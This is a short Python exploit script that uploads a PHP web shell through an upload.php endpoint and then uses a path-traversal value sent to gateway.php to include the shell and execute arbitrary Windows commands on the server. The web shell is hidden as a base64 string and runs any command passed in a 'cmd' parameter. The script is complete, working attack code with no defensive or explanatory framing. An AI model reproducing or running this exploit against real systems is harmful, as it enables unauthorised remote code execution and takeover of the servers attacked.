import requests
import optparse
import base64
import re
print('''
Author:ghtwf01
''')
parser = optparse.OptionParser("-u <upload target> -i <include target>")
parser.add_option('-u', dest='upload_url', type='string', help='upload.php路径')
parser.add_option('-i', dest='include_url', type='string', help='gateway.php路径')
parser.add_option('-o', dest='cmd', type='string', help='需要执行的命令')
(options, args) = parser.parse_args()
upload_url = options.upload_url
include_url = options.include_url
cmd = options.cmd
with open("shell.phtml","w") as file:
    file.write(base64.b64decode("PD9waHAKJGNvbW1hbmQ9JF9HRVRbJ2NtZCddOwokd3NoID0gbmV3IENPTSgnV1NjcmlwdC5zaGVsbCcpOwokZXhlYyA9ICR3c2gtPmV4ZWMoImNtZCAvYyAiLiRjb21tYW5kKTsKJHN0ZG91dCA9ICRleGVjLT5TdGRPdXQoKTsKJHN0cm91dHB1dCA9ICRzdGRvdXQtPlJlYWRBbGwoKTsKZWNobyAkc3Ryb3V0cHV0Owo/Pg==").decode("utf-8"))
upload_file = {'ATTACHMENT':open('shell.phtml','r')}
upload_data = {"P":"1", "DEST_UID":"1", "UPLOAD_MODE":"1"}
response = requests.post(upload_url, upload_data, files=upload_file)
path = response.text
dectory_name = re.findall(r'[@]\d{4}[_]', path)[0].strip('@_')
file_name1 = re.findall(r'[_]\d+[|]', path)[0].strip('_|')
file_name2 = re.findall(r'[|]\w+.\w+[|]', path)[0].strip('|')
file_name = file_name1+"."+file_name2
json = '{"url":"../../ispirit/../../attach/im/'+dectory_name+'/'+file_name+'"}'
include_data = {
    'json' : json,
    'cmd' : cmd
}
res = requests.get(include_url, include_data)
print(res.text)